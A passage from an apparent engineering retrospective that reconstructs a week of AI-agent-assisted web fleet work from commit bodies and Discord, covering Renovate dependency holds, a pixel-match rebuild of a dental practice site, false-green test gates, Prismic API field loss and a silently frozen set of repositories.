Fable 5` (5 merged PRs, #483–#487). The split falls exactly at the boundary
between the week's **product** work and its **fleet-governance** work. MEASURED:
the trailer change and its timestamp. INFERRED and **unverifiable from this
corpus**: whether that was a deliberate model choice for a different kind of
task, a session boundary, or a harness default. Both trailers appear earlier in
the repo's history, so this is not a first-use event.

## Corrections and course-changes — week 1

No operator course-correction is recoverable for this week; there are no
transcripts, and `metrics.json.byDay` reports `sessions: 0, prompts: 0,
interruptions: 0` for all four days. Every correction below is a belief
corrected **on contact** and written into a commit body by the agent itself, or
a judgment visible in Discord. **None of them are Tucker redirecting an agent
mid-session, and that channel must not be inferred for this week.**

- The header-image screen rect, "confirmed to within 0.03%", retracted thirteen
  minutes later: precision is not accuracy, and a content-derived landmark loses
  to a content-independent one.
- "Nothing links to the roster stubs", retracted: the scan enumerated document
  types by hand and missed the largest type.
- A lightbox test that passed over an empty array, twice.
- A hero fix that passed its own verification at 4 routes × 5 breakpoints and
  was still the wrong model.
- `.github`#11's `platformAutomerge` fix, inert against the real path, corrected
  2h36m later by #12.
- #478's mutable-ref hardening, missing the ci.yml pin it was not briefed on,
  corrected an hour later by #480.
- #483's protection alarm, unable to ever fire, caught in its own pre-merge
  review.
- #486's liveness probe, counting run existence rather than run success.
- A "queue is empty" verdict that was GitHub's 30-per-page default.
- #487's armed clobber: self-healing toward a canonical template is only safe
  where the canonical form is a superset of every live form.
- Tucker's one operator ruling, in Discord: no hand-built forms that take
  financial information. A liability boundary, not a technical preference.

---

# Week 2 — 2026-08-03 to 2026-08-09

> **RECONSTRUCTED.** Still no transcripts: `sessions.jsonl` and `prompts.jsonl`
> return zero rows for all seven days. 278 commit rows / 271 unique SHAs, 122
> PRs opened and 93 merged. 194 commit rows are Tucker's and **84 are
> `reddoor-renovate[bot]`** — roughly 30% of the week's commit volume is the bot
> merging its own dependency PRs in-run, almost all of it on Monday. The one
> near-verbatim operator utterance available outside Discord survives because an
> agent quoted it into a commit body.

A Webflow client site was rebuilt pixel-by-pixel against its own live stylesheet
and cut over to a hard $40 billing deadline, while the fleet's Monday dependency
batch had to be held back by hand six times — and the week's loudest lessons all
came from instruments that were green about things they structurally could not
see.

## Monday morning: the dependency batch that had to be held back six times

The fleet preset lives in `reddoorla/.github` and Renovate's cron is `before 6pm
on monday`. The batch arrived and six separate holds were written into the
preset before lunch. Each hold's commit body names the specific breakage, which
makes this an unusually legible record of what a weekly batch actually costs.

**07:37 — TypeScript 7 capped below 7.0.0**, because "every one hard-fails CI
with 'typescript-eslint does not support TS 7.0.'" MEASURED: the TS-7 branches
redded CI in five repos that day, and every `typescript to v7` PR in the corpus
is `CLOSED — autoclosed`.

**07:53 → 08:07 — the cookie override, merged before it was understood.** This
is the sharpest fourteen minutes of the week. At 07:53:29 and 07:53:34 the PR
`chore(deps): update dependency cookie@<0.7.0 to v2` **merged** into `espada`
(#53) and `hedloc` (#25). At 07:56:38 the preset gained a fleet-wide hold. At
08:07:09 and 08:07:14 both sites got `fix(deps): re-cap the cookie override
below 1 (defuse the <3 widening)`.

The espada commit body explains what the merged PR actually did: "Renovate's
weekly batch widened the vuln-wave override target to `'>=0.7.0 <3'`. pnpm keeps
resolving 0.7.2 while the lockfile holds it, but any fresh resolution (next
lockfile maintenance) would jump to cookie 2.x — whose removed parse/serialize
exports break every current @sveltejs/kit server build."

**The belief corrected on contact, and it is a keeper.** A Renovate PR titled
"update dependency cookie@<0.7.0 to v2" is not a dependency upgrade at all. It
is a rewrite of a pnpm **override key**, and the key names the range being
overridden _away from_. The PR looks like a bump and is a delayed bomb: nothing
breaks at merge, because the lockfile still pins 0.7.2; it detonates at the next
`lockFileMaintenance` regeneration. Every other repository's copy of the same PR
is CLOSED in the corpus — **fourteen closes against two merges**, which is what
a correct rule applied after two mistakes looks like.

The same class struck again the same day inside the central repository. A memory
file written that evening is unambiguous: do not merge the `brace-expansion@… to
v5` security PRs Renovate opens against pnpm overrides, because "Renovate reads
the pnpm override **key** (`brace-expansion@<1.1.16`) as if it were a resolved
dependency at a vulnerable version… Merging would WIDEN the cap to `<6`, and the
three separate ranges exist precisely because three minimatch majors coexist
(3.1.5, 9.0.9, 10.2.6), each needing its own brace-expansion major." The reach
analysis that made it a non-emergency is worth keeping too: `pnpm why --prod`
traces `@reddoorla/maintenance` → typescript-eslint → eslint → minimatch@10 →
brace-expansion, and "eslint never runs in a deployed site, and the vuln needs
_attacker-controlled glob patterns_ — our glob patterns are authored config."
The clearing action was a lockfile refresh of eleven open maintenance PRs,
"census-verified: all lockfile-only, all resolving 5.0.9, no cookie-override
jump" — each one _read_ before merge, specifically because of what had happened
four hours earlier.

**08:12 → 10:21 — the preset used as a two-hour mutex.** A hold went in on
`@sveltejs/vite-plugin-svelte` below 7 ("Plugin 7 needs vite 8 (rolldown) +
svelte >=5.46.4. Fleet sites on vite 6/7 can never green these PRs — the plugin
silently fails to register"), and came back out **2 h 09 m later** once the
vite-8 wave had landed on all four lagging sites. That is a deliberate and
reusable pattern: the fleet preset as a temporary brake while a migration wave
is prepared by hand, then released. The removal commit also names the cost of
leaving it on: "The hold was also freezing plugin updates on the ~15 sites
already on 7.x."

**10:39 — a hold that did not cover its own surface.** "The 11.8.x pnpm hold
matched only depType packageManager, so Renovate bumped pnpm/action-setup's
`version:` input to 11.18.0 while packageManager stayed held at 11.8.0 —
action-setup hard-errors on the mismatch." The follow-on fix deleted the pins
entirely rather than re-pinning them, **0 additions and 14 deletions across 7
files**: "packageManager is the single source." This is a lesson the fleet had
already recorded — a hold scoped by `matchDepTypes` misses the dependency's
other manager — arriving again from a new surface.

**10:52 — `@libsql/client` held at 0.8.x**, because the kysely adapter
hard-depends on `^0.8.0` and bumping the direct client to 0.17 "forks the tree
into two incompatible Client types and fails typecheck."

**Honest accounting:** six preset changes, two bad merges corrected in 14
minutes, one hold raised and lowered inside two hours, and 23 red CI runs across
13 site repositories — all before 11am on a Monday, for a batch that in
principle merges itself. Whatever the automation buys, it did not buy this
morning back.

## The vite-8 wave: a first model tried, failed CI, and abandoned for one four times larger

MEASURED, from the PR record: three near-identical PRs titled `svelte 5.56.8 +
@sveltejs/vite-plugin-svelte 7 (paired majors)` were opened on gallerysonder
(+25/−41), revogen (+76/−92) and vineyard-custom-homes (+83/−114), and **all
three were CLOSED**. Three replacements titled `vite 8 stack (rolldown)` opened
and **all three merged** (+355/−169, +345/−67, +358/−81).

So the first model of the problem — pair the two majors and the plugin will
register — was tried, failed CI, and abandoned within the same morning for a
model four to five times the diff size: vite 8.2 (rolldown), plugin-svelte 7.2,
svelte 5.56 and tailwind 4.3. gallerysonder needed one extra change nobody had
predicted: switching off the rolldown-incompatible postcss route to
`@tailwindcss/vite`. **To revive the abandoned approach: you cannot. Plugin 7
requires vite 8.**

The evidence that closed it is worth quoting because it is the _reason_ the
migration could be trusted: "Verified locally: build, vite dev boot,
svelte-check, and the a11y audit (pass) — the audit's dev-server was exactly
what plugin-7-without-vite-8 broke." The failing symptom and the verifying
instrument were the same thing, which is the cheapest verification available,
and it was available only because the fleet already runs an a11y audit against a
live dev server.

## the-pointe-burbank: a design round where the agent over-read the client

This is a Blux-frozen page — a Webflow-era export re-rendered from a baked
artifact — in design-review round 4 against Figma pins from Nicole. Five PRs
landed on 08-03 between 13:03 and 19:13.

**The correction, at 14:26.** Round 4 had shipped animated underlines on the nav
items, and they were reverted:

> "The nav lines were mine, not Nicole's. Her 51:42 comment — 'could this
> underline come in like the other double line graphic?' — is pinned on the FIT
> Health Club BODY link; round 4 read it as covering links generally and gave
> the nav the same treatment on top. Asked to take them off."

The revert is **+41 / −121 across 4 files**: the pseudo-element, its scaleX
draw, the per-item stagger, its reduced-motion gate, the class and a
scroll-position trigger all came back out. The body-link draw-in, which is what
the comment actually asked for, stayed. The lesson is scope, not quality — the
work was good and the mechanism was sound, and it was applied to an element
nobody asked about. **A design comment's anchor is part of its content.**

The same shape recurred an hour later on the LEED badge: "Round 4 read Nicole's
'could you make the image 10% smaller?' literally and took 10% off the width.
The badge still stood a third taller than the building icons beside it, because
it is the only square artwork in a row of 67.92%/68.18% ones — equal width in
that row is not equal size to the eye." Re-solved as height parity and then
checked against **ink**: measured at 4× on the deploy preview, the icons' ink
runs 67.5 / 67.0 / 73.0 tall and the badge fills 95.5% of its square, so 72.8 px
of box reads as 69.6 px of ink — 0.4 px off their mean, inside the 6 px spread
the icons already have between themselves. **A design request states an intent,
not an arithmetic operation.**

**The false green in the same repo, at 16:11.** Clicking either carousel arrow
appeared to do nothing and slides 2 and 3 went blank. `show()` toggled display,
opacity and pointer-events but not the freeze's baked `transform`, so an
activated slide rendered one or two full track-widths to the left inside
`overflow:hidden`. Two things made it invisible: "the state machine WAS correct,
and the 13 unit tests only ever asserted state"; and under `vite dev` the
committed slot defaults point at Blux CloudFront, which `img-src` blocks, so
"**a slide parked off-screen and a slide with no photograph look identical.**"
The file's own comment asserted the opposite of the truth — that the baked
transforms were "inert track geometry" — and a comment that is wrong is worse
than no comment, because it is the thing a reader checks instead of the code.

**The white flash that took four attempts.** Each commit is honest that the
previous had not closed it. At 17:14, preload plus a true dissolve, traced on the
preview ("the fade began at +5058ms and the response landed at +5078ms") and
carrying a compositing error: both slides were animating, and "two opacities
meeting at .5 composite to .5 + .5×.5 = .75: a quarter of the page's own light
background showed THROUGH the middle of every transition." At 18:12, a readiness
gate, because "preloading warms the cache but gates nothing" — reproduced under
1.6 Mbps throttling with the fade running all 600 ms while every slide reported
`complete === false`, and waiting on `decode()` as well as `load` because "a
downloaded 3960×2640 JPEG still has to become a bitmap." At 18:25, stop racing
and shorten the race: the three slides ship at origin resolution into a
1425×760 box, costing 3.4 MB even as AVIF, "roughly seven times the pixels the
band can show"; `w=2400` took one slide from 1103 KB to 537 KB. At 18:32, accept
the residual and make it survivable — a backdrop of `rgb(63,62,40)`, the mean of
the three photographs' own colours at 62%, "so an unpainted slide reads as the
picture not being there yet rather than as a hole."

Two more green-test defects fell out of that: dropping the resize step from the
pipeline "failed nothing, because every end-to-end assertion ran against
CloudFront defaults the step deliberately ignores"; and the URL assertion used
`toContain("&w=2400")`, which passed happily on a URL where the parameter landed
_after_ the closing quote of `url('…')` — a URL no browser would fetch. **An
assertion matching a substring of a URL cannot tell a valid URL from a broken
one.**

It was generalised the same evening across all 50 images — "5.06MB of Prismic
imagery, 4.03MB of it in files far larger than their box — a 5774px original
(1.34MB) into an 823px box" — and pushed upstream into central as #506, the
freeze recording each image's painted box. The load-bearing fact is that **the
size cannot be derived from the markup**: Blux sets it in CSS, so an element
carrying `width:5774px` renders into an 823 px box. Its corollary is the kind of
thing only measurement finds: "image CDNs upscale past the widest render that
exists rather than refusing — a 123px badge asked for 900px goes from 4.9KB to
30KB." Twenty-four of the fifty slots were therefore left alone.

## Beachfront Dentistry: 90 commits, six pages, and a launch to a $40 renewal date

This is the spine of the week. `beachfront-dentistry` is a pixel-match rebuild
of a live Webflow dental practice site into SvelteKit + Prismic, governed by the
`matching-a-page` skill, run 08-03 through 08-07 against a deadline that appears
in Discord.

**The deadline was a renewal date.** On 08-04 Tim asks whether he should add
articles to the Webflow CMS; Tucker: _"yeah I would wait, should cutover from
webflow on thursday."_ On 08-06 Tim: _"1. Is this ready for review/comments? 2.
**This renews on August 8** so if we can get it close enough I say we switch it
and then tighten it up."_ On 08-07: _"I have made 90% of my comments and invtied
you to the DNS. If we can switch over ASAP today and I cancel we save $40."_
Tucker: _"popping it over, working on the rest when I'm back in monday"_, then
_"will be a little bit, I need to set the forms to live too so they aren't
missing leads over the weekend"_, then at 00:49Z: **"dns is switched over."** The
last commit before the switch landed **ten minutes** earlier.

**The measured arc**, every number quoted from a commit body. Region gates
(regions passing, threshold 0.10, matrix 1440/834/390, no masks): home 17/27 →
**24/27**; your-first-visit 5/24 → **21/24**; services 4/15 → **13/15**;
our-team 6/15 → **13/15**; ask-the-doctor 7/15 → **13/15**; contact 5/12 →
**10/12**; detail templates 27/30. The style census — undeclared type mismatches
across 9 pages × 3 viewports — ran **192 → 124 → 100 → 57 → 48 → 0** across six
commits on 08-05 between 20:14 and 21:41. The residual open failures are almost
all declared floors (the cross-origin Google Maps iframe "Chromium will not
composite in a full-page capture") plus one operator-ACKed copy decision.

**The single systemic trap, and what it cost.** Live's root-font ladder: an
inline `<style>` steps `html{font-size}` to 40 px ≥993, 32 px 769–992, 24 px
≤768, while the Webflow class rules break at 991/767/479. Every rem value
therefore has **three** sizes. Calibrate md at **834, never 768**; lg at
**1200/1440, never 992**. "Most defects on this project were a two-tier ladder
keyed at 768, leaving the whole 768–991 band rendering the desktop value." The
belief corrected on contact is that the Webflow tablet band is not "mobile
bigger" or "desktop smaller" — it is a third independent value, and any number
read by measuring live at exactly 768 px is 3/4 of live's real value in that
band. The skill repo took it upstream the same day, adding that the root
24/32/40 "scaling" is a red herring and most elements step at 480.

## The four (then five) discipline rules, turned into programs that exit non-zero

At 12:16 on 08-05, after roughly thirty hours of matching work, a `CLAUDE.md`
was committed to the beachfront repository. The commit body opens by answering a
question:

> **Answering "are you using the skill or winging it?" honestly:** the gates and
> the ledger were run faithfully, but four parts of the matching-a-page skill had
> drifted, and each drift cost real rework.

(PROVENANCE: that question appears inside a commit body, quoted by the agent. It
is the agent's report of what was asked, not a recording — there are no
transcripts for this week.)

The four drifts, as recorded: `matching/SPEC.md`, the Phase 1 deliverable, was
never written for the nav pages, "which is why live's root-font ladder, the
`.content-width` ladder and `.hero.group-photo`'s own height ladder were each
found reactively, after the region had already failed several rounds"; geometry
fixes were applied from probed rects rather than the reference stylesheet, and
**"the two fixes that landed first-try came from grepping `beachfront.css`; both
fixes that had to be reverted came from a probe"**; Phases 5 and 6 never ran on
the nav pages; and the three-strike stop rule was blown twice.

And the response, which is the reusable part: **"Written rules did not hold on
their own, so each is now a check that fails."** `matching/gate.sh` exits 2 on
any page with no SPEC section, "so a refused page cannot be reported as a
score." `matching/strikes.mjs` reconstructs every region's history from the
`out-*/report.json` corpus and exits 1 while any failing region has been flat
across three or more runs — and is honest about its own limits: "report.json
cannot record intent, so it measures **stalls** (an upper bound on attempts)
rather than claiming to count them."

**And it was proven on known-good input before its verdicts were used.** Run
against the existing corpus, strikes.mjs "independently confirms both admitted
stalls plus the ask-the-doctor grid: atd 'Beyond the Smile' 79–83% flat across
5–7 runs, yfv `top` 76.2% @834 flat across 6." A stall the operator already knew
about was the calibration input. That is this repo's central rule applied
correctly, unprompted, a week before the rule was written down.

Each rule ships with an **operator's challenge** — the sentence Tucker can now
say that the rule makes answerable: _"which line of beachfront.css says that?"_,
_"show me the SPEC section for that region"_, _"how many runs has that region
been flat?"_, _"paste the gate header."_ The check exists to make a one-line
human audit cheap, not to replace the human.

A fifth rule landed four hours later, and its diagnosis of _why_ is unusually
candid:

> **rule 5 — a commit is a checkpoint, not a stopping point.** … The failure was
> habitual rather than deliberate — a turn ends when user-facing prose gets
> written, and 'I just committed something good' is exactly the moment that
> invites writing it.

That is a statement about agent turn-taking dynamics, written by the agent, and
it is probably the single most transferable sentence in the week.
`matching/next.mjs` was built to exit 1 while any real failure remains, so the
round continues while it does.

**And next.mjs shipped a false green of its own, caught on its second use:** it
ranked run directories by mtime without checking their meta, so a `--mask-photos`
DIAGNOSTIC became the "latest" report and yfv's top region read 43.9% where the
unmasked gate had it passing at 1.3%. It now skips any run carrying masks, media
neutralisation, truncation, or a threshold other than 0.10 — **"a diagnostic is
never the state of the page."**

## Five episodes where the gate itself was the defect

These are the highest-value items in the week for understanding how this
workflow fails. In each one the gate produced a confident, precise, wrong number
that was then chased as a layout defect.

**(i) The CSP-blocked photograph.** `svelte.config.js`'s `img-src` never allowed
`cdn.prod.website-files.com`, so every `/dev/match` hero photo was CSP-blocked
and **the gate diffed a black band against live's photograph.** Correcting it
moved our-team `top` from 58.7% → 17.8% @1440, 76.3% → 18.9% @834, 69.8% →
20.5% @390.

**(ii) The gate cutting the two pages at different elements.** The
ask-the-doctor "Beyond the Smile" region "sat at 79–83% across 8 gate runs, was
carried as ACK-REQUIRED/unexplained since 2026-08-04, and **which this ledger
twice diagnosed wrongly** (first 'large-area colour delta', then 'vertically
offset grid'). It was a missing wrapper element." Live's `.qa-text` collapses to
a 320 px box; ours was a bare 80 px `<h3>`; "page-diff cut live at that 320px
box and cut us at the bare 80px `<h3>` — 220px apart, comparing every atd region
against the wrong content. 220/635 = 34.6%, exactly the `top` region's reported
height delta." The fix took the page 7/15 → 13/15 and the region from
79.1/79.3/82.7% to 4.6/1.0/1.7%. The method is the finding:

> What found this was not a better probe of the same thing but a different
> question: **what element does the gate actually cut on, on each side?**

**(iii) The anchor finder's selector list.** page-diff's anchor finder queries
`h1-h6,p,a,li,span,div,section,button`. `article` is not in that list, so an
`<article>` card was skipped and a cut landed 80 px lower — the region measured
680 against live's 800 and "the pixel score was comparing misaligned windows."
Same root cause as (ii), found independently on another page.

**(iv) The pixel gate is blind to sticky positioning.** Live's hand mark is
`position:sticky; top:0`. "A full-page screenshot renders sticky elements at
their UN-STUCK position, so the pixel gate scores the two as identical; only
scrolling to the section and shooting the viewport shows it." A ~150 px offset
scoring as a perfect match.

**(v) The pixel gate is blind to everything behind a click.** This is the last
real bug of the launch, reported by Tim in Discord at 21:26Z — _"the 'ask the
doctor' modules on the home page, text is getting caught off when you click on
the title"_ — and fixed 2 h 17 m later. Measured: at 1440 the box is 120 px and
the answer 193 px, clipping 73; at 834, 96 against 172, clipping 76; at 390, 72
against 183, clipping 111 — **61% of it hidden.** Live gives the teaser variant
of that box two heights (`3rem` collapsed, `8rem` active) and only the collapsed
one was ever implemented. The commit says why nothing caught it: "every gate
here (page-diff, style-census, text-diff, gate-published) measures the page in
its DEFAULT state. This defect existed only after a click: the matching skill's
Phase 5 blind spot, which had no mechanical check at all." The new test asserts
_rendered geometry_, not class names, "because the bug was content not fitting
its container and only measuring both can see that", and asserts the box still
clips "so it cannot pass vacuously."

**Honest accounting on that one:** a paying client found a visible bug on the
home page on launch day, after five days of gate-measured work in which the gate
score for that page was 24/27. The score was not wrong. It was answering a
different question.

## The Prismic Migration API drops undeclared fields silently, at HTTP 200

The 08-06 morning block is a single defect class worked to the bottom. Published
`page` documents rendered **24–43% differently** from their `/dev/match` twins
on three pages.

> Cause: the Migration API validates a document against the slice models
> registered in Prismic and **DROPS every undeclared field — silently, with a 200.**

Four fields at first (`heading_style`, `image_position`, `hero_wash`, and
Carousel's `layout`), then a fifth found by the dry run — `order_uids`, which
carries live's your-first-visit slider order; stripped, that page fell back to
the our-team ordering. And a second, distinct loss: the API strips `\n` out of
StructuredText on write, which cost the closing CTA band its three hard-broken
lines — **168 px shorter on four of the five nav routes**, and 168 of home's 316.

**Why every gate stayed green through all of it:** "all of them run against
`/dev/match/*`, which reads the fixture object directly and never round-trips
through Prismic's validation."

The response was three layers, each proven to fail before being trusted. A
fixture-vs-local-model test, "Verified failing — removing carousel
`review.layout` fails the third case — before being verified passing." A
recognised limit stated plainly: that test "CANNOT catch this class: it compares
the fixture to the LOCAL model, and the local model was right. **The binding
constraint is the REMOTE model, which needs the network.**" Hence
`push-slice-models.mjs`, `push-custom-types.mjs`, and a seed precondition
asserting models are in sync _before_ writing anything, again verified failing
on a bogus local field first. And finally a published-vs-fixture gate whose
opening line is the general lesson:

> CLAUDE.md has said since the migration defects that after any seed you must
> "diff a real route against its `/dev/match/*` twin rather than assuming they
> agree" — **but that was a thing to remember, not a thing to run. This is the
> script.**

Result on the published release: all five core pages, Δh 0/0/0 and 0 text lost
at all three viewports.

**A belief corrected in passing that unblocked the whole day:** "The write token
DOES carry the Custom Types API scope (`GET /slices` → 200) — **the earlier 403
was the Slice Machine session in `~/.prismic`, not the token.** So the whole
push/seed round is scriptable after all." A day earlier the same work had been
recorded as needing Slice Machine's UI. **A 403 identifies a rejected
credential, not which credential was used.**

**A near-miss worth recording.** Comparing raw model JSON "called all 30 models
'different', burying the 3 that were", because Prismic's serializer reorders
keys, adds `"select": null`, and returns an `imageUrl` per variation that is
`""` on disk. Normalising took 30 → 3. "The `imageUrl` one was not cosmetic: a
push REPLACES the model, so sending the local `""` would have blanked **all 42
slice previews** in the editor UI as a side effect of adding a field."

## The secret in the spec, and CI's first red in two days

08-06 at 10:10, three reds traced to one commit — the `.gitignore` change that
started tracking `matching/`. A **GitHub secret-scanning alert for a Google Maps
API key, publicly leaked in a public repo**, at two paths. It was _live's own
key_, "lifted verbatim while documenting the contact page's tile URLs."
Redacted, with the honest follow-up: "the tip is clean but **HISTORY IS NOT**,
and the repo is public, so rotation/referrer-restriction of that key is the only
real remediation." A pattern sweep for Google/Stripe/Slack/Mapbox/SendGrid/private
keys found nothing else. Alongside it, 230 newly-tracked files of which **189
failed `prettier --check`** (formatted rather than ignored: "they are tracked
source now"), and a hard prerender failure because `/ask-the-doctor` links to
`#hero` and nothing carried that id — "a dead link that the prerenderer,
correctly, refuses to ship."

## PR #17: the shape of a long branch

MEASURED. Opened 2026-08-04 20:25Z, merged 2026-08-07 16:29Z — **68 hours 4
minutes**. **+47,824 / −840 across 288 files**, most of it the 228-file, 2.4 MB
`matching/` corpus finally being tracked. **0 reviews, 1 comment.** And **52
failing CI runs** on the branch between 08-05 09:03Z and 08-06 17:39Z — that is
essentially the entire life of the branch red, in a 33-hour span with failures
landing every 10–30 minutes. It went green on 08-06 17:39Z and merged 22 hours
later.

INFERRED, stated as inference: the 52 reds are not 52 distinct defects. The
branch was pushed after every gate round while `prettier --check`, `svelte-check`
and `pnpm build` were only run locally at round boundaries, and the three reds
diagnosed at 08-06 10:10 account for the class. The observable cost is that **CI
carried no signal on the main line of work for 33 hours** — a genuinely new
failure arriving in that window would have been indistinguishable from the
standing red.

The merge commit chose history over tidiness and says why: "Merged rather than
squashed: each commit body cites the file:line its fix came from, which is the
project's evidence trail."

## Launch day: 44 verified improvements, one escalation, and one thing refused

08-07 opens with a verified improvements backlog — "44 items from a
six-dimension audit (accessibility, SEO, performance, UX, code health, editor
experience), each put through a **separate skeptic pass** that opened the cited
file and rejected anything inaccurate, already done, out of scope, or larger
than a few hours." Nine shipped the same day.

A `LandscapeModal` fired on `(pointer: coarse)` and `(orientation: landscape)
and (max-width: 1023px)` and was "an opaque black `aria-modal='true'` overlay
with no close button, no Escape handler, no focus trap and nothing reachable
behind it" — WCAG 2.1 SC 1.3.4, and _harsher than the reference_, which fires a
dismissible `alert()`. "It came from the starter's initial commit, not a matching
round, and **no gate viewport is landscape-shaped so nothing ever exercised
it.**" Four of six nav pages shipped with no `<h1>`, verified against the built
pages. 4.8 MB of hero video was preloading before hydration, racing the LCP
poster the same component preloads a few lines above. `menu-beach.jpg`, a
5472×3648 camera original at 2.20 MB used under a 92%-opaque wash, was
re-encoded to 156 KB (−93.1%) — "Not judged by eye — composited both versions
under that exact wash and diffed: **0.000% of pixels differ** at 1440×900 AND at
2560×1440 retina." A single-location dental practice had **zero** structured
data while `Seo.svelte` had accepted a `jsonLd` prop all along: "So this is
wiring, not authoring." Every booking failure was discarded silently — "that is
a patient lost with no trace at either end" — verified by running a new 13-test
suite against the old component: **7 of 13 fail.** And 18 absolute cross-links
across 9 paths, **5 of which 404**, a genuine launch blocker because SvelteKit's
prerenderer crawls same-origin links and `kit.prerender.origin` comes from
Netlify's `URL`: "Point the real domain at the site and those links become
internal, get crawled, and the build fails on the first 404 … **CI passes only
because GitHub Actions sets no URL.**" One repair could not have been found by
any link checker: an anchor reading "When tooth pain is a dental emergency"
pointed at a _different_ article that returns 200. **Anchor text wins.**

**The escalation, and it is the right one.** The a11y suite had "audited three
`/dev/*` FIXTURE routes and not one page a patient can reach", and "had been
green all project". Pointed at the real pages, it immediately found a WCAG 2.1
AA 1.4.3 failure: live's brand cyan `#129ecc` on its own pale band `#e7f5fa`
measures **2.77:1** against a 3:1 large-text threshold — **missed by 0.23** —
one root cause, 19 identical nodes across three pages. The commit refuses to
decide it:

> **NOT fixed here, and NOT suppressed.** … On a pixel-matching rebuild that is
> a brand-colour decision, so it goes to the operator with measurements rather
> than being taken unilaterally: `#0f8fb8` is 3.34:1 (minimal move from the
> brand), the existing `--primary-deep #0e7799` is 4.58:1.

And it refuses to let an earlier approval widen itself: an ACK of "footer color
is fine" from 08-03 "was scoped to one heading, and this is the same swap across
three pages' most prominent headings." The suite was then built so the recorded
exception cannot rot — the rule list is asserted per page **and** the exact
colour pair is asserted, "so a contrast failure with any OTHER pair fails."
Both guards were verified to bite.

Ten minutes before DNS, one last fleet clearance found two instruments
disagreeing about the same files: "the fleet's lint audit calls
`prettier.resolveConfig()` and this repo had no prettier config at all, so it
resolved to `{}` and checked `.svelte` files WITHOUT `prettier-plugin-svelte`,
reporting them unformatted. **Our own CLI passed the plugin by flag, so `npm run
lint` was green while the audit would not have been.**"

## Two forms incidents in one day, and a probe that passed while the form was failing

**A real lead reported as failed.** A 1836dig visitor was shown the form's
failure copy while the lead was already stored (`sub_f4f195ff`) and the operator
email delivered. The site's 8 s abort budget fired before central responded;
central persists the row **before** its best-effort tail, so past the insert an
abort reports failure for a submission that succeeded. The 8 s budget "was
calibrated against a 10s Netlify sync limit; `SYNCHRONOUS_FUNCTION_TIMEOUT` is
now 30, and **8s never cleared a cold call (~5–7s measured)**." Raised to 20 s,
with the pin test derived from the platform constant rather than from the
number, and the best-effort tail moved off the critical path.

**And here is the false green.** The nightly form end-to-end probe's testMode
submissions "short-circuit before the classifier, insert and Resend call, so a
green verdict could not see the slow path — **it recorded a clean pass the same
day the form was failing for visitors.**" The fix does not manufacture a red it
has no evidence for; it makes the probe **report budget headroom** and raise
`BUDGET_THIN` as a GitHub warning, while the persisted verdict stays "pass"
because the form works. **An instrument that cannot reach a failure mode should
report what it can see, not assert a verdict it cannot justify.**

**A client received a test lead.** Test-submitting a live client form emails the
client. The only thing between that and a safe test is one Airtable Status cell,
and nothing reported its state. "On 2026-08-03 **the flip never landed, a real
client received one, and email cannot be recalled.** A guard whose state you
cannot see is a guard you will eventually assume is on."

The design of the fix is the lesson, and four of its properties are worth
lifting whole. **Asking is free**: `forms-notify-target <site>` is read-only by
default, "asking must never be riskier than not asking." **A write returning is
not evidence**: `--set on` flips the guard and then **re-reads the row**; an
unconfirmed flip prints NOT CONFIRMED, says not to test-submit, and exits
non-zero — which is the exact mechanism by which the incident happened. **No
second copy of the rules**: every address reported comes back out of
`resolveRecipients` itself, "so this cannot drift into a second, confidently-
wrong copy of the routing rules." And **guard the inverse failure too**: `--set
off` requires an explicit `--restore` and never infers one, and the command
refuses to flip any site that is not `maintenance`. Verified with 3,582 tests,
each guard mutation-tested (mutation confirmed applied, then confirmed caught),
plus a live read-only run that correctly identified the client who received the
errant email.

## Nine repos frozen for a week, with green CI, a clean cockpit and no alarm

The largest silent failure of the week. Nine fleet repositories —
alamo-anatomy, caltex-landing, gallerysonder, espada, hedloc, data-dynamiq,
medical-solutions-of-texas, revogen and la-homelessness-initiative — "had **all
non-major updates silently frozen since 2026-07-27** — including
`@reddoorla/maintenance`, `@sveltejs/kit`, `vite`, `@playwright/test`,
`svelte-check` and `node`. **CI was green, the cockpit was clean, and no alarm
fired.**"

Root cause: an unintended consequence of the 08-02 GitHub App identity
migration. Each repo still had a leftover `renovate/all-minor-patch` branch whose
tip commit was authored by the retired PAT identity `renovate-bot`. Renovate,
now `reddoor-renovate[bot]`, compares the branch's last commit author to its own
identity, concludes a human edited the branch, and files it under **"PR Edited
(Blocked) — Renovate will no longer make changes."** Perfect correlation
confirmed it: all nine blocked repos had `renovate-bot` tips dated 07-27; every
healthy repo had a `reddoor-renovate[bot]` tip dated 08-03 or no branch at all.

**The detection gap, stated exactly right in #503's body:**

> protection-audit's renovate surface asked only 'did the workflow run and
> succeed?'. On 2026-08-03 nine repos answered yes to that while shipping zero
> dependency updates for a week … **A liveness probe structurally cannot see
> this — the workflow is doing its job, it is just not permitted to do
> anything.** So read the outcome Renovate itself publishes: its Dependency
> Dashboard, the one place it admits to having given up on a branch.

**A belief explicitly retracted.** An earlier PR (#501) had attributed fleet
drift to "Renovate can't cross a 0.x minor / in-range counts as up to date". The
memory says flatly: "That is WRONG as a cause — the dashboard proves Renovate
detects the update and wants it (`@reddoorla/maintenance ^0.75.0` → `[Updates:
^0.79.0]`). The blocker was the orphaned branch." It keeps the true part: "A
pre-1.0 caret IS still a real constraint worth fixing… but it was not what froze
these repos." **A plausible mechanism that is present is not therefore the
cause.**

And the adversarial review of the new detector found four defects that each cost
real behaviour. `renovate-bot` is GitHub type `User`, not `Bot` — "the obvious
'flag bot-authored tips' rule would have missed this exact incident" — so
detection keys on machine identity with a staleness backstop "so identity drift
degrades detection to slower, never blind." "PR Edited (Blocked)" is not by
itself a fault: pushing a commit onto an open Renovate PR is routine here, **16
such PRs across 14 repos in one day**, and "alarming on all of them would fire
nightly on healthy in-flight work and prescribe deleting the operator's
commits." Renovate renamed the heading in 43.0.0, and the fleet takes its
Renovate major from whatever the action bakes in, so both spellings parse and
unknown sections alarm: _"couldn't check" must never read as "healthy"._ And
`gh api repos/X/issues` needs `--paginate`, because the dashboard is typically
the _oldest_ open issue — proven against `renovatebot/renovate` itself, whose
dashboard is issue #2958 from 2018 and read `{present:false}` without it.

Then the instrument was proven **both ways** before being trusted: clean over 27
org repos with no false positives, **and** fired correctly against three
genuinely-blocked third-party repositories. Mutation testing caught the worst of
it: "a broken jq selector, a dropped `--paginate`, and unwired section parsing
**all shipped green through the full suite**."

## Two shared-config bugs found by reading, not by failing

Both the same shape: a fix applied in one place long ago and never propagated to
the place sites actually consume.

**#500 — vite binding to a port nothing probes.** "Both shared configs pin a
fixed 5173 and then leave vite free to drift off it. The audits fixed this for
themselves a while back … but the configs SITES consume directly never got the
same treatment." playwright-a11y then fails _loudly but uselessly_: "the run dies
